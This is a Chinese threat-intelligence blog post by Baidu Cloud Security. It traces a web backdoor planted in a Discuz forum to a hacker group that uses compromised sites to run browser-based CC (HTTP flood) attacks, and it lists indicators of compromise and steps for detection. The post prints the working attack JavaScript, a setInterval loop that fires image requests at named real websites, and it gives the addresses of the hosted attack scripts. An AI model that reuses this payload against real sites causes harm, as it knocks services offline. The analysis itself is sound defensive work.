> 原文链接: https://www.anquanke.com//post/id/82983 


# 从异常挖掘到CC攻击地下黑客团伙


                                阅读量   
                                **88524**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0123d1313f5e229bdb.jpg)](https://p3.ssl.qhimg.com/t0123d1313f5e229bdb.jpg)

**异常挖掘与回溯**

        11月13日,百度云安全天网系统,通过数十TB的日志挖掘,发现了安全宝某重点客户网站上的异常行为。之后我们的分析人员跟进,发现这是一起针对安全宝某重点客户的持续攻击。最终在客户系统上放置了Web后门。

该Web后门的通信如下:



```
POST /uc_server/data/logs/20140708.php?v=1a HTTP/1.1
Host: bbs.xxxxx.com
Referer:http://bbs.xxxxx.com/uc_server/data/logs/20140708.php?v=1a
User-Agent: Sogou
Content-Length: 60
```



        从通信流量上看,并未触发任何报警。同时,客户的日志里也并未保存http response的数据。

        天网系统中的谛听模块通过对网站的访问行为进行建模,通过每个被防护的网站日志训练出这个网站特有的访问模型。包括网站参数的模型,网站访问路径的模型,网站访问session的模型。黑客这次的访问行为触发了网站访问路径模型的异常。该模型中通过每个路径访问的频度广度和路径之间的访问关系等feature,训练出针对每个网站特定的路径视图。

        我们在系统中对该客户的所有历史日志进行了回溯,发现该黑客在9月24日就已经对该客户展开了尝试性的攻击。

        通过进一步的分析,我们发现,该攻击者修改了Discuz系统的class_core.php。在该class_core.php中添加的代码如下:



[![](https://p1.ssl.qhimg.com/t01b45ad317eeb34070.jpg)](https://p1.ssl.qhimg.com/t01b45ad317eeb34070.jpg)



        从该代码中,我们可以做出以下结论:
<ol class=" list-paddingleft-2" style="list-style-type: lower-alpha"><ol class=" list-paddingleft-2" style="list-style-type: lower-roman">
<li>
这次攻击不是小范围的针对单个站点的攻击,而是攻击了多个站点
</li>
<li>
该代码中并未指定特定的CC攻击的目标,而是通过Location统一跳转到<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://file.lbgoo.com/file_120/37/ver.php</a>,由该url指定最终的攻击目标。
</li>
<br>

**影响确认和攻击代码**

        我们从CC的攻击代码中提取了以下特征fuwuqibeiheikeruqin,在现有的网页情报库中搜索,发现以下的链接地址:

<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://www.eoeandroid.com/forum.php?wangzhanbeihei&amp;fuwuqibeiheikeruqin&amp;qinggenghuanfuwuqi&amp;chongzhuangwangzhan</a>

        判断eoeandroid也被这样攻击过。

        11月20日,<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://file.lbgoo.com/file_120/37/ver.php</a>请求被重定向到<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://www.eoeandroid.com/forum.php</a>?,11月20日发现eoeandroid已经503了。该攻击手法被进一步确认

        我们又对该代码中提及到的php100.com  www.dm123.cn和12edu.com进行访问。发现如下:

        以dm123.cn为例:



[![](https://p0.ssl.qhimg.com/t01133866551fd5c215.jpg)](https://p0.ssl.qhimg.com/t01133866551fd5c215.jpg)



        显然该网站被利用来做CC攻击。

        同时我们针对以上网站挂CC攻击的js进行了分析,发现有三种。
<ol class=" list-paddingleft-2" style="list-style-type: lower-alpha">
<li>
 dm123.cn中,直接在dm123网站上挂js,脚本路径如下
</li>
<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://www.dm123.cn/gd.js</a>

         2. php100.com中,托管在SAE上的攻击脚本,脚本路径如下:

<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://jsddos.sinaapp.com/ddos.js</a>

         3. 12edu.com中,通过api接口动态获得要攻击的网站,更加难以定位:

<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://www.12edu.com/api.php?op=count&amp;id=34380&amp;modelid=1</a>

        以上三种方式,从扫描器检测的角度来看,复杂度逐渐增大。第一种情况下,是直接检测本域下的js。第二种则需要检测外链js,检测量大大增大了。而第三种则是在已有的js里面没有攻击代码。攻击的代码是通过api接口动态获得的。

攻击用的js代码如下:

```
function imgflyygffgdsddfgd() `{`
var TARGET = 'www.hanyouwang.com'
var URI = '/index.php?wangzhanbeihei&amp;fuwuqibeiheikeruqin&amp;qinggenghuanfuwuqi&amp;chongzhuangwangzhan&amp;'
var pic = new Image()
var rand = Math.floor(Math.random() * 1000)
pic.src = 'http://'+TARGET+URI+rand+'=val'
`}`
setInterval(imgflyygffgdsddfgd, 0.1)
function imgflyygffhghddfgd() `{`
var TARGET = 'www.weshequ.com'
var URI = '/Search/v-wangzhanbeihei&amp;fuwuqibeiheikeruqin&amp;qinggenghuanfuwuqi&amp;chongzhuangwangzhan&amp;'
var pic = new Image()
var rand = Math.floor(Math.random() * 1000)
pic.src = 'http://'+TARGET+URI+rand+'=val'
`}`
setInterval(imgflyygffhghddfgd, 0.1)
```

被攻击域名包括重要政府网站和国家级新闻媒体

<br>

**身份确认**

        通过域名的相似度,我们在现有的网页情报库中发现了如下域名:

        博客:<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://jsddos.blog.163.com/</a>  

        论坛:<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://www.jsddos.com/</a>

        在163博客上可以看到,该团队名 ddos Js团队,QQ 2

        在网页情报库中查找该QQ,可以发现<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://www.mspycn.com/about.html</a>

        看来除了卖ddos的服务,还在卖手机监听软件的服务

        对该域名的whois进行查询,如下:

[![](https://p4.ssl.qhimg.com/t0175f954cabd1c32e9.jpg)](https://p4.ssl.qhimg.com/t0175f954cabd1c32e9.jpg)





        从我们发现该攻击到发稿前,该黑客做了如下的事情,
<ol class=" list-paddingleft-2" style="list-style-type: lower-alpha"><ol class=" list-paddingleft-2" style="list-style-type: lower-roman">
<li>
修改了<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://file.lbgoo.com/file_120/37/ver.php</a>的指向
</li>
<li>
Php100.com已经不再受影响
</li>
<br>

**后续**

        我们有理由相信,这是一个在不断进化的地下黑客团体。通过更加隐蔽的手法进行CC攻击挂马。该问题的影响范围目前我们还在进一步确认。欢迎业内同仁继续跟进分析。

        如果你想查看自己的网站是否受影响,有两个步骤:

            打开网站,随机访问几个页面,查看下面是否会发起连续的对其他网站的请求<br>            查看是否会发起请求:http://file.lbgoo.com/file_120/37/ver.php

        我们从该攻击中提取了以下信息作为攻击情报或者IOC:<a style="text-decoration: underline;font-family: 微软雅黑,Microsoft YaHei;font-size: 14px">http://file.lbgoo.com/file_120/37/ver.php</a>
